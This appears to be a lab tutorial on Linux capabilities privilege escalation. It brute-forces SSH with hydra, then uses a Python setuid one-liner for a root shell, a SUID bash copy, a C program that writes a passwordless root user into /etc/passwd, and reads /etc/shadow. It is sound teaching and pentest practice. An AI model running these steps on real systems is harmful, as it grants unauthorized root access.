<h1 align="center"> Linux Capabilities Enumeration </h1>







# Introduction

## What is Linux Capabilities?

### The Evolution:
- Old Way: SUID binaries - All or nothing root access
- New Way: Capabilities - Fine-grained privileges


## What are Capabilities?
Capabilities break down root privileges into smaller, specific permissions. Instead of giving a program full root access (SUID), you can grant only the specific privileges it needs.


## Why Capabilities Master for Privileges Escalation:
- More common in modern systems
- Often misconfigured
- Less monitored than SUID binaries
- Can provide root-level access if exploited
- Harder to detect than traditional SUID





---




# Linux Capabilities Enumeration:

## 1. Reconnaissance & Crack SSH
- First in this i scan to our target:
````
nmap 192.168.127.131 -sV -T4
````
<img width="1191" height="275" alt="image" src="https://github.com/user-attachments/assets/ec5c743a-da1d-45cc-a2aa-15b241c99065" />


- After i crack this target `SSH Port`:
````
hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt -t 4 -s 22 192.168.127.131 ssh -V -f
````
````
hydra -l k4n0ng -P /usr/share/wordlists/passwd.txt -t 4 -s 22 192.168.127.131 ssh -V -f
````
<img width="1902" height="518" alt="image" src="https://github.com/user-attachments/assets/797181c5-9a89-4cbc-ad3d-45d00cb23a42" />


- Now we found the correct `Password`, and after I login to it:
````
ssh k4n0ng@192.168.127.131
````
<img width="720" height="425" alt="image" src="https://github.com/user-attachments/assets/600da6aa-45af-4b1e-99d2-9090eea4403c" />

- Now we was access to our target `ssh port`.

---




## 2. What are Capabilities in Linux?
### Capabilities Sets
Each process has three capability sets:
- **Inheritable (i)**: Capabilities preserved across execve()
- **Effective (e)**: Currently active capabilities
- **Permitted (p)**: Capabilities that can be made effective
- **Bounding**: Limits what can be added to permitted
- **Ambient**: Inherited across exec calls


### Traditional UNIX vs. Linux Capabilities
- Traditional UNIX:
  - Privileged: euid = 0
  - Unprivileged: euid ≠ 0
- Linux (Kernel ≥ 2.2):
  - Privileges are split into distinct units called capabilities
  - These can be enabled or disabled per thread

**Purpose**: Capabilities implement the least privilege design principle — giving processes only the permissions they need.



````
getcap /usr/bin/ping
````
<img width="469" height="130" alt="image" src="https://github.com/user-attachments/assets/cf4561fa-2779-4ee4-8eba-90b729dea56e" />

- `getcap /usr/bin/ping`: This checks what Linux capabilities are assigned to the ping binary.
- `cap_net_raw`: This capability allows a process to use raw sockets, which are required for sending ICMP packets — the core of what `ping` does.
- `=ep`:
  - `e`: Effective: The capability is active and usable.
  - `p`: Permitted: The process is allowed to use it if needed.



#### Website that we should know:
- man7: https://man7.org/linux/man-pages/man7/capabilities.7.html
<img width="875" height="1026" alt="image" src="https://github.com/user-attachments/assets/85f9c8a2-670a-49fe-9690-74e61efcee92" />

- Hacktricks: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities

- But in this my browser was block it.

---





## 3. Configuration


### What is Configuration?
Configuration of capability enumeration in Linux involves listing, assigning, and modifying capabilities on executables or processes using tools like `getcap`, `setcap`, and `capsh`. This allows you to control which fine‑grained privileges a binary or process can use, instead of granting full root access.


### Listing Capabilities

#### For executables:
````
getcap /usr/bin/ping
````
<img width="396" height="100" alt="image" src="https://github.com/user-attachments/assets/c69dc03e-1e07-45e2-b255-109ca7155f51" />

- In this it will show assigned capabilities `cap_net_raw=ep`.

#### For processes
- Find the Process ID (PID):
````
ps aux | grep ping
````
<img width="987" height="110" alt="image" src="https://github.com/user-attachments/assets/95ee5b5e-dcd2-410c-a1fe-301e1df5c318" />

- Line 1:
  - **PID** `2716`: This is the `gsd-housekeeping` process (part of GNOME system services).
  - It’s not `ping`, but it showed up because its command line contains the string `ping`.
- Line 2:
  - **PID** `15515`: This is the `grep` command you just ran (`grep ping`).
  - It matches itself because the word “ping” is in its arguments.


---




## 4. Finding Capabilities

### Basic Enumeration:
#### Find all files with capabilities
````
getcap -r / 2>/dev/null
````
<img width="1726" height="295" alt="image" src="https://github.com/user-attachments/assets/dc0e274d-d9ac-411c-b8d7-8be358736cee" />



#### Using find command
````
find / -type f -exec getcap {} \; 2>/dev/null
````
<img width="1724" height="290" alt="image" src="https://github.com/user-attachments/assets/155ab0b8-9da9-43da-83f0-48a864154714" />



#### Check specific directories
````
getcap -r /usr/bin /usr/sbin /bin /sbin 2>/dev/null
````
<img width="687" height="140" alt="image" src="https://github.com/user-attachments/assets/f8430d3c-ddfb-412e-b35e-53b36eb19a5f" />




## 5. Enumeration automated script:

#### System-Wide Capability
````
# SYSTEM-WIDE CAPABILITY SEARCH
echo "=== 1. ALL FILES WITH CAPABILITIES ==="
getcap -r / 2>/dev/null | while read line; do
    echo "$line"
done
echo ""
````
<img width="1741" height="410" alt="image" src="https://github.com/user-attachments/assets/fc87e18d-123b-442d-be65-dfb86c144f6a" />

- Recursively lists all files with capabilities set.

- This script we can create `.sh` file or we can copy this and past to `Terminal`:
````
nano sys_wide.sh
````
````
# SYSTEM-WIDE CAPABILITY SEARCH
echo "=== 1. ALL FILES WITH CAPABILITIES ==="
getcap -r / 2>/dev/null | while read line; do
    echo "$line"
done
echo ""
````
<img width="1041" height="402" alt="image" src="https://github.com/user-attachments/assets/4a219fd8-fe23-4962-8716-2e9288de2f89" />

- to exit press `Ctrl + O` -> `Enter` -> `Ctrl + X`.

- Executive:
````
chmod +x sys_wide.sh
````
<img width="380" height="128" alt="image" src="https://github.com/user-attachments/assets/77b7e142-9244-44ef-81c2-da69858587f3" />


- Run
````
./sys_wide.sh
````
<img width="1747" height="297" alt="image" src="https://github.com/user-attachments/assets/e77b45da-c8d8-4e77-b88b-06de89099ed1" />




#### Dangerous Capabilities:
````
echo "=== DANGEROUS CAPABILITIES FOUND ==="
DANGEROUS_CAPS="cap_dac_read_search|cap_dac_override|cap_setuid|cap_setgid|cap_sys_admin|cap_sys_ptrace|cap_sys_module"

getcap -r / 2>/dev/null | while read line; do
    if echo "$line" | grep -q -E "$DANGEROUS_CAPS"; then
        echo "[!] DANGEROUS: $line"
    fi
done
echo ""
````
<img width="1886" height="293" alt="image" src="https://github.com/user-attachments/assets/5f987b90-721d-48ee-9013-1edebd7adcbf" />


- Flags binaries with high‑risk capabilities that could be abused





#### Current Process Capabilities
````
# PROCESS CAPABILITIES
echo "=== 4. CURRENT PROCESS CAPABILITIES ==="
echo "Current PID: $$"
cat /proc/$$/status | grep -i cap
echo ""
````
<img width="525" height="279" alt="image" src="https://github.com/user-attachments/assets/8a0dfe0e-c0c7-4d84-9ba0-3f86e71b066e" />

- Shows capability bitmasks for the shell process running the script.
- **CapInh (Inheritable)**: `0000000000000000` → No inheritable capabilities. Your shell won’t pass any capabilities to child processes.
- **CapPrm (Permitted)**: `0000000000000000` → No permitted capabilities. The process has no privileges it could potentially make effective.
- **CapEff (Effective)**: `0000000000000000` → No effective capabilities. Your shell is running as a normal user with no elevated privileges.
- **CapBnd (Bounding Set)**: `000001ffffffffff` → This is the upper limit of capabilities available on your kernel. It means the kernel supports a wide range of capabilities, but your process doesn’t currently hold any.
- **CapAmb (Ambient)**: `0000000000000000` → No ambient capabilities. Nothing persists across execve calls.




#### Kernel Capability Support
````
# KERNEL CAPABILITIES SUPPORT
echo "=== 5. KERNEL CAPABILITY SUPPORT ==="
if [ -f /proc/sys/kernel/cap-bound ]; then
    echo "Capability bounding set: $(cat /proc/sys/kernel/cap-bound)"
else
    echo "Kernel capability file not found"
fi
echo ""
````
<img width="726" height="226" alt="image" src="https://github.com/user-attachments/assets/0a5a78f8-e888-4168-9041-4aa0795214e9" />

- Displays the kernel’s bounding set (limits on what capabilities can be added).
- But in this we see not found.

#### Capability Management Tools
````
# CHECK FOR CAPABILITY TOOLS
echo "=== 6. CAPABILITY MANAGEMENT TOOLS ==="
which capsh 2>/dev/null && echo "capsh found: $(which capsh)"
which setcap 2>/dev/null && echo "setcap found: $(which setcap)"
which getcap 2>/dev/null && echo "getcap found: $(which getcap)"
echo ""
````
<img width="713" height="297" alt="image" src="https://github.com/user-attachments/assets/3610f0e3-d324-49d5-ab11-0f56743797a5" />

- Confirms if capability management tools (capsh, setcap, getcap) are installed.




### Quick Enumeration One-Liner:
- Find all capabilities quickly
````
getcap -r / 2>/dev/null | grep -v "=$" | while read line; do 
    file=$(echo $line | cut -d' ' -f1); 
    caps=$(echo $line | cut -d' ' -f2); 
    echo "[+] $file : $caps"; 
done
````
<img width="1785" height="373" alt="image" src="https://github.com/user-attachments/assets/3b7c703d-0ba4-45aa-b643-a19bf218e85a" />

- this command is a **capability enumeration script** that scans the filesystem, filters out empty entries, and prints a clean list of binaries with assigned capabilities.


---


## 6. Enumeration capabilities:

````
getcap /usr/bin/ping
````
<img width="420" height="95" alt="image" src="https://github.com/user-attachments/assets/33c06609-8aca-4958-a8e4-1928b6b2afd9" />


````
getcap -r / 2>/dev/null
````
<img width="1735" height="225" alt="image" src="https://github.com/user-attachments/assets/04ff5ecb-b150-4ce9-b600-73bacff38b9c" />

- `/usr/bin/ping` and `/usr/bin/mtr-packet`: have `cap_net_raw=ep`
  - This allows sending raw network packets (normally a root-only action).
  - Common and expected for network diagnostic tools.
- `gst-ptp-helper`: has `cap_net_bind_service`, `cap_net_admin`, `cap_sys_nice=ep`
  - Used for media synchronization; these capabilities are normal in multimedia contexts.
- `snap-confine`: has multiple powerful capabilities like `cap_sys_admin`, `cap_sys_ptrace`, `cap_chown`
  - These are expected for Snap sandboxing but worth monitoring due to their escalation potential.

- **This command scans the system for files with extra powers — a key step in Linux security auditing.**


````
ps aux
````
<img width="1271" height="800" alt="image" src="https://github.com/user-attachments/assets/a9d39e28-0064-46ef-b306-7e513d0bcbd0" />

<img width="1390" height="836" alt="image" src="https://github.com/user-attachments/assets/0f338a19-f9dd-4804-9a48-46ae96125d08" />

- In this if I want to choose this to do enumeration:
````
getpcaps 6074
````
<img width="347" height="109" alt="image" src="https://github.com/user-attachments/assets/d0e513a1-e628-4eba-bb05-0eab57db50c5" />

- In this we don't see has no special capabilities assigned.
- And if others we will see something like: `1234: = cap_net_raw+ep`



### Proc 
````
cd /proc
ls
````
<img width="1892" height="403" alt="image" src="https://github.com/user-attachments/assets/588bc3f1-6a74-4499-8bb6-ccef1821c9ce" />

````
cd 811
ls
````
<img width="1631" height="246" alt="image" src="https://github.com/user-attachments/assets/31eacff0-7357-421d-92d5-7e90585edf6c" />


---







## 7. Dangerous Capabilities Explained

### cap_dac_read_search & cap_dac_override
#### These allow reading/writing ANY file, regardless of permissions
- If /usr/bin/python3 has cap_dac_read_search:
````
sudo python3 -c "open('/etc/shadow').read()"
````
<img width="626" height="93" alt="image" src="https://github.com/user-attachments/assets/a45a1403-f5ce-4e0b-943e-406f077b23ba" />

- Check permsiion:
````
ls -l /etc/shadow
````
<img width="570" height="113" alt="image" src="https://github.com/user-attachments/assets/28c205a4-7696-458a-9662-70016550cf45" />

- Meaning only `root` and members of the `shadow` group can read it.

- Check if any binary has dangerous capabilities:
````
getcap -r / 2>/dev/null | grep cap_dac_read_search
````
<img width="1740" height="122" alt="image" src="https://github.com/user-attachments/assets/cde2e992-4a5a-454f-8eea-1e4013c4d965" />


-  If a binary has this capability, it could bypass file read restrictions.
- `cap_chown`: Change file ownership.
- `cap_dac_override`: Bypass file read/write/execute permission checks.
- `cap_dac_read_search`: Bypass directory read/search restrictions (dangerous for /etc/shadow).
- `cap_fowner`: Override file ownership checks.
- `cap_setgid / cap_setuid`: Change group/user IDs.
- `cap_sys_chroot`: Use chroot, potentially escape confinement.
- `cap_sys_ptrace`: Trace other processes (debugging, but exploitable).
- `cap_sys_admin`:  Extremely powerful, often considered “root equivalent.”
- We can show recruiters that you don’t just run enumeration scripts, we interpret the results and connect them to real attack surfaces.



### Others:
#### **cap_sys_admin**: 
- Very dangerous - allows many administrative operations
- Can mount filesystems, modify kernel parameters, etc.

- If a binary has cap_sys_admin, it can:
  - Mount / unmount filesystems
  - Perform swap operations
  - Set hostname
  - Many other privileged operations

#### **cap_sys_ptrace**:
- Allows debugging/attaching to any process.

- If /usr/bin/gdb has cap_sys_ptrace.
- Can attach to root processes and inject code.

- Exploitation:
````
gdb -p 1
````
<img width="794" height="480" alt="image" src="https://github.com/user-attachments/assets/fe0edf32-4125-4c07-be24-bc853f1fcdac" />

<img width="792" height="512" alt="image" src="https://github.com/user-attachments/assets/1b4621db-ec16-4992-b9e9-2c45d79388ff" />

<img width="879" height="767" alt="image" src="https://github.com/user-attachments/assets/ee4ff54f-3866-4433-bf48-853c23123b94" />

- type `q` to exit.

````
p/x $rax
````
<img width="214" height="126" alt="image" src="https://github.com/user-attachments/assets/a7cb6232-9d18-42ce-93cb-7afbdfffc7e8" />


- Attach to PID 1 (init, usually root)


#### **cap_sys_module**:
- Allows loading/unloading kernel modules.

- If a binary has cap_sys_module:
  - Can load malicious kernel module for root access
  - Dangerous because kernel modules run at ring 0.
 

---




## 8. Exploitation Scenarios

### 1. Python with cap_setuid
#### Discovery 
- Find capabilities:
````
getcap -r / 2>/dev/null
````
<img width="1734" height="215" alt="image" src="https://github.com/user-attachments/assets/118aeb87-496d-4b6f-b95f-8aecf4ad6ce2" />


#### Exploitation:
- Direct root shell:
````
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
````
<img width="874" height="176" alt="image" src="https://github.com/user-attachments/assets/0724b9a8-d324-493d-a548-0a58d71f672a" />

- In this password what that we find in brute force.


- Create SUID bash
````
python3 -c "import os; os.setuid(0); os.system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash')"
````
````
/tmp/rootbash -p
````
<img width="1279" height="151" alt="image" src="https://github.com/user-attachments/assets/536727f4-263b-49cb-8991-1dcc376aac38" />




### 2. Binary with cap_dac_read_search
#### Discovery:
````
getcap -r / 2>/dev/null
````
<img width="1721" height="219" alt="image" src="https://github.com/user-attachments/assets/7e7552b2-3637-4d9c-a42b-9c7e29fd975e" />

- `getcap`: shows Linux file capabilities (special privileges given to executables).
- `-r /`: search recursively starting from root `/`.
- `2>/dev/null`: hide error messages (like permission denied).
- **This command scans the whole system for files with special capabilities, useful in security auditing and ethical hacking.**




### 3. cap_dac_override - Write Anything

#### Discovery 
````
getcap -r / 2>/dev/null
````
<img width="1721" height="219" alt="image" src="https://github.com/user-attachments/assets/7e7552b2-3637-4d9c-a42b-9c7e29fd975e" />



#### Exploitation:

- If binary exists and writes files, make it write to /etc/passwd

- Create malicious C program
````
nano /tmp/evil.c
````
````
#include <stdio.h>
int main() {
    FILE *fp = fopen("/etc/passwd", "a");
    fprintf(fp, "hacker::0:0:hacker:/root:/bin/bash\n");
    fclose(fp);
    return 0;
}
````
<img width="944" height="341" alt="image" src="https://github.com/user-attachments/assets/9501bab0-3a2b-48a7-8129-53c0de31f652" />

- To exit press `Ctrl + O` -> `Enter` -> `Ctrl + X`.

````
gcc /tmp/evil.c -o /tmp/evil
````
<img width="503" height="91" alt="image" src="https://github.com/user-attachments/assets/78f3591f-fd5a-49ff-ae59-1f5654e719c3" />



- Set capabilities (if we can)
````
sudo setcap cap_dac_override+ep /tmp/evil
````
<img width="620" height="61" alt="image" src="https://github.com/user-attachments/assets/ba3b27dd-55ad-4d9d-9e3e-5bfa5fc9d594" />

- Execute:
````
/tmp/evil
````
<img width="363" height="104" alt="image" src="https://github.com/user-attachments/assets/85fd4456-dbbb-4fa6-8f94-be6548f05c40" />

Now we have root user `hacker` with no password

- Check to see `hacker` user:
````
cat /etc/passwd
````
<img width="991" height="843" alt="image" src="https://github.com/user-attachments/assets/4171cb10-73f8-44cc-b2c1-11a93719f276" />

<img width="957" height="528" alt="image" src="https://github.com/user-attachments/assets/49a1f212-b001-490a-8682-143e2f01fa98" />

- Now we see use `hacker`.

- After login to `hacker`:
````
su hacker
````
<img width="456" height="125" alt="image" src="https://github.com/user-attachments/assets/29605f82-b864-4e19-b757-b9257ca02893" />

Now we got `root` user.


---






## 9. Advanced Exploitation Techniques

### 1. Using capsh for Testing
capsh is a capabilities shell wrapper:

#### Test capabilitie
- Check initial state
````
ca[sh --print
````
<img width="1916" height="379" alt="image" src="https://github.com/user-attachments/assets/3abb15b0-d545-49aa-9c3a-328215bc18eb" />


- Drop all capabilities except what we need
````
sudo capsh --caps="cap_setuid+eip cap_setgid+eip" --keep=1 --user=nobody --addamb=cap_setuid -- -c "/bin/bash"
````
<img width="1338" height="122" alt="image" src="https://github.com/user-attachments/assets/cb6c93a6-5d48-43aa-9d1d-530e16386491" />

- **This command is used to spawn a shell as nobody but with special capabilities (setuid/setgid) that let it change user/group IDs. It’s a lab demonstration of how Linux capabilities can override normal privilege boundaries.
**

- Verify:
````
capsh --print
````
<img width="1913" height="377" alt="image" src="https://github.com/user-attachments/assets/b0fe22be-a31f-40c6-9dd1-3f3f9a86539c" />


---




## 10. Finding Hidden Capabilities

### Check Processes:

#### List all processes with capabilities
````
for pid in $(ps aux | awk '{print $2}'); do
    if [ -f "/proc/$pid/status" ]; then
        caps=$(grep Cap /proc/$pid/status 2>/dev/null)
        if echo "$caps" | grep -q -v "0000000000000000"; then
            echo "PID $pid has capabilities:"
            echo "  $caps"
        fi
    fi
done
````
<img width="712" height="830" alt="image" src="https://github.com/user-attachments/assets/24e834cd-1698-42ff-9fcf-d34a454137b6" />

- Now we can view all processes.


#### Check Container Capabilities:
````
cat /proc/1/status | grep Cap
````
<img width="512" height="166" alt="image" src="https://github.com/user-attachments/assets/da03a2ec-be49-4497-a7a2-cab496e06ad8" />


----




## 11. Automated Tools

### 1. LinPEAS Capabilities Detection:
- First in this i need to install `Linpeas`:
````
sudo apt update && sudo apt install -y curl
````
<img width="942" height="491" alt="image" src="https://github.com/user-attachments/assets/07459856-153d-41ac-9390-81ebd0982f3c" />


- Download the latest linpeas.sh
````
curl -LO https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
````
<img width="1052" height="197" alt="image" src="https://github.com/user-attachments/assets/d05fb8ff-8534-4887-9d99-bf1a48c9e9ae" />

- Execute
````
chmod +x linpeas.sh
````
<img width="404" height="82" alt="image" src="https://github.com/user-attachments/assets/29624657-5b68-4764-91a0-b6d69dde1a13" />


- LinPEAS automatically checks for capabilities
````
./linpeas.sh | grep -i -A5 -B5 "capabilities"
````
<img width="1918" height="737" alt="image" src="https://github.com/user-attachments/assets/303c2937-e909-4982-b85f-52c7ef9820dc" />

<img width="1919" height="828" alt="image" src="https://github.com/user-attachments/assets/832ceb99-c1c8-42c0-a97f-78762cd4b8ed" />

<img width="1738" height="782" alt="image" src="https://github.com/user-attachments/assets/46a398c1-32ac-4c3e-865b-c462125e245b" />

<img width="1726" height="426" alt="image" src="https://github.com/user-attachments/assets/76de8821-0567-4f5b-ae04-88b3f5f175af" />


- High-Severity Finding: Writable Binary `with cap_dac_override`:
````
/tmp/evil cap_dac_override=ep
/tmp/evil cap_dac_override=ep is writable
````
Why This Matters:
- `cap_dac_override` allows a process to bypass all file read/write/execute permission checks (even for root-owned files).
- Since `/tmp/evil` is writable by your user, you can:
  - Replace it with your own malicious binary, or
  - Modify it to execute arbitrary code with `cap_dac_override`.

- We can exploit it:
````
sudo nano /tmp/pwn.c
````
````
#include <unistd.h>
#include <stdlib.h> 
#include <stdio.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
````
<img width="533" height="301" alt="image" src="https://github.com/user-attachments/assets/8a9ae801-4594-4339-9c0f-7fa2446c7f25" />




- Compile it
````
gcc -o /tmp/pwn /tmp/pwn.c
````
<img width="499" height="87" alt="image" src="https://github.com/user-attachments/assets/272f5ae3-8396-453d-94df-6b3eecb82f39" />


- Copy it over /tmp/evil (since it’s writable):
````
cp /tmp/pwn /tmp/evil
````
<img width="421" height="104" alt="image" src="https://github.com/user-attachments/assets/c2f8b9aa-8cec-4abb-aa92-07d9495c332b" />



- Execute it:
````
/tmp/evil
````
<img width="296" height="73" alt="image" src="https://github.com/user-attachments/assets/4bcafd74-8d55-4180-86d5-ee98558d52c3" />

In this nothing happened (no shell, no output). That’s because having cap_dac_override alone is not enough to give you a root shell.


---



### 2. linux-exploit-suggester-2.pl
````
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
````
<img width="1909" height="243" alt="image" src="https://github.com/user-attachments/assets/f6d38d91-7680-4727-a03d-8e70fcceda3a" />

````
chmod +x linux-exploit-suggester-2.pl
````
<img width="610" height="71" alt="image" src="https://github.com/user-attachments/assets/7d0e1b7b-f727-4f34-a366-cbada28ad4dd" />

````
./linux-exploit-suggester-2.pl
````
<img width="657" height="261" alt="image" src="https://github.com/user-attachments/assets/9732ae28-249c-4d0b-88ba-fd84dbf9ee90" />

- But in this we kernel version we can do with.


-----




## Key Takeaways
### For Attackers/Pentesters:
- Always check capabilities - `getcap -r / 2>/dev/null`
- **cap_setuid is as good as SUID** - can become root instantly
- **cap_dac_read_search/override** can read/write any file
- **Look for interpreters** (python, perl, bash) with capabilities
- Check both files and processes for capabilities

### For Defenders/Admins:
- Audit capabilities regularly - remove unnecessary ones
- Never give capabilities to interpreters (python, perl, bash)
- Use principle of least privilege - give only what's needed
- Monitor capability changes with auditd
- Consider capability bounding sets for containers





----


<h2 align="center"> Finished of Capabilities Enumeration </h2>

<h2 align="center"> Credit By: Nin Kanong (k4n0ng) </h2>


<h3 align="center"> Date: 22/12/2025 </h3>
